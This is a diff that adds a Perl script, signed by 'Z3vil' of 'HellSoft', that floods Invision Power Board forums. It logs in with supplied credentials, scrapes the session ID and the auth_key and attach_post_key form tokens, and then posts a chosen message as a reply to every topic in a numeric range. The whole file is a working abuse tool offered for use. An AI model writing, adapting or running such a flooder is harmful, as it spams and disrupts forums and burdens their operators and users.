@@ -1,0 +1,103 @@
+#----------------------------
+#   this programe has been  #
+#   created by Z3vil        #
+#   [ 'HellSoft' ] for      #
+#   Flooding IPB Forums     #
+#   19/03/2008  2:39:00AM   #
+#   Adrabi[at]Gmail[dot]com #
+#----------------------------
+
+#!/usr/bin/perl -w
+use strict;
+use LWP::UserAgent;
+use HTTP::Cookies;
+use URI::Escape;
+
+#Variables
+my  $url        =   undef;
+my  $login      =   "act=Login&CODE=01";
+my  $UserName   =   undef;
+my  $PassWord   =   undef;
+my  $CookieDate =   1;
+my  $SID        =   undef;
+my  $SE         =   undef;
+my  $MSG        =   undef;
+
+#Prototype
+sub IPBFlood($);
+
+#Main
+print "\t\tWelcome to IPBFlood 0.1x By Z3vil\n\t\t[ 'HellSoft' ]Team\n\n";
+
+print "Url\t: ";chomp($url=<STDIN>);
+print "UserName\t: ";chomp($UserName=<STDIN>);
+print "Password\t: ";chomp($PassWord=<STDIN>);
+print "Start [to] End\t: ";chomp($SE=<STDIN>);
+print "Message\t: ";chomp($MSG=<STDIN>);
+
+my  $ua     =   LWP::UserAgent->new;
+$ua->agent("Mozilla/4.0");
+my  $cj     =   HTTP::Cookies->new(file => "N/A" , autosave => 0);
+$ua->cookie_jar($cj);
+
+#-get SID
+my  $r      =   $ua->get($url);
+if($r->is_success){
+    #Find SID ?s=a9c1185db9ac8098927be2c7dce41e3b&
+    ($SID) = $r->content =~/\?s=(\w{32})&.*/i;
+    print "SID : $SID\n";
+}
+
+#-Connecting ...
+$r          =   $ua->post($url.$login,[UserName=> $UserName ,PassWord => $PassWord ,CookieDate =>$CookieDate , s => $SID]);
+if($r->is_success){
+    print "[+] Connected\n\n" if($r->content =~ /cliquez ici si vous ne souhaitez pas/gi);
+    my($Start , $End) = split(/-/,$SE);
+    foreach($Start..$End){
+        IPBFlood($_);
+    }
+}
+
+sub IPBFlood($){
+    my $Topic   =   shift;
+    my $get     =   $ua->get($url."s=$SID&showtopic=$Topic");
+    if($get->is_success){
+        #Get Subforum ID "f" : variable !
+        if( my ($f) = $get->content =~/f=(\d{1,4})/ ){
+            print "[-]Subforum ID : $f & Topic N : $Topic\n";
+            #Get Post AuthKey for Subforum f=N°
+            $get    =   $ua->get($url."s=$SID&act=post&do=reply_post&f=$f&t=$Topic");
+            #                          act=post&do=reply_post&f=56&t=43988
+            if($get->is_success){
+                ##auth_key Ex : <input type='hidden' name='auth_key' value='ad21a6bcbe870e7ef76a2d77251a304e' />
+                my ( $auth_key ) = $get->content =~/auth_key.*(\w{32})/i;
+                #attach_post_key Ex : <input type='hidden' name='attach_post_key' value='cb044c3477c703695e699fc91f98e27c' />
+                my ( $attach_post_key ) = $get->content =~/attach_post_key.*(\w{32})/i;
+                print "[-]auth_key : $auth_key\n[-]attach_post_key : $attach_post_key\n";
+                
+                
+                my %form =(st                 =>  0,
+                           act                =>  "Post",
+                           s                  =>  "$SID",
+                           f                  =>  "$f",
+                           auth_key           =>  "$auth_key",
+                           removeattachid     =>  "0",
+                           CODE               =>  "03",
+                           t                  =>  "$Topic",
+                           attach_post_key    =>  "$attach_post_key",
+                           parent_id          =>  "0",
+                           "ed-0_wysiwyg_used"=>  "0",
+                           "editor_ids%5B%5D" =>  "ed-0",
+                           Post               =>  "$MSG",
+                           enableemo          =>  "yes",
+                           enablesig          =>  "yes",
+                           iconid             =>  "0"
+                           );
+                $r      =   $ua->post($url."s=$SID",\%form);
+                if($r->is_success){
+                    print "Send success !\n" if( length($r->content)< 300);
+                }
+            }
+        }
+    }
+}
